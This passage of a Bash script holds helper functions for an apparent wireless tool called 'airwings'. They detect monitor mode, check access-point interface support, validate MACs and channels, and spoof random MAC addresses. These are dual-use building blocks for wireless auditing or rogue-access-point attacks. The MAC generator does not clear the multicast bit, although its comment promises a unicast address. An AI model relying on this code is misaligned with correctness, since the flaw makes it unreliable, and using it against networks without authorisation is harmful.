    du -h "$f" 2>/dev/null | cut -f1
}

pause() {
    read -rp "Press Enter to continue..." _tmp
}

success() {
    echo -e "${GREEN}[✓] $1${NC}"
}

warning() {
    echo -e "${YELLOW}[!] $1${NC}"
}

error() {
    echo -e "${RED}[!] $1${NC}"
}

is_monitor_mode() {
    local ifc="$1"
    [[ -z "$ifc" ]] && return 1
    if ! ip link show "$ifc" &>/dev/null; then
        return 1
    fi
    if command -v iw &>/dev/null; then
        iw dev "$ifc" info 2>/dev/null | grep -qi "type monitor" && return 0
    fi
    if command -v iwconfig &>/dev/null; then
        iwconfig "$ifc" 2>/dev/null | grep -qi "Mode:Monitor" && return 0
    fi
    return 1
}

check_vif_support() {
    # best-effort: check if `iw` exists and reports supported interface modes
    if command -v iw &>/dev/null; then
        iw list 2>/dev/null | grep -q "AP" && return 0
    fi
    # fallback: assume true
    return 0
}

is_valid_mac() {
    [[ "$1" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]
}

is_valid_channel() {
    [[ "$1" =~ ^[0-9]+$ ]] && (( "$1" >= 1 && "$1" <= 165 ))
}

generate_random_mac() {
    # generate a locally administered unicast MAC (set the 2nd least significant bit)
    local a b c d e f
    a=$(( (RANDOM % 256) | 2 ))
    b=$((RANDOM % 256))
    c=$((RANDOM % 256))
    d=$((RANDOM % 256))
    e=$((RANDOM % 256))
    f=$((RANDOM % 256))
    printf "%02x:%02x:%02x:%02x:%02x:%02x" "$a" "$b" "$c" "$d" "$e" "$f"
}

create_temp_dir() {
    mktemp -d /tmp/airwings.XXXXXX 2>/dev/null || (mkdir -p "/tmp/airwings.$$" && echo "/tmp/airwings.$$")
}

clean_temp_dir() {
    [[ -n "$1" && -d "$1" ]] && rm -rf "$1"
}
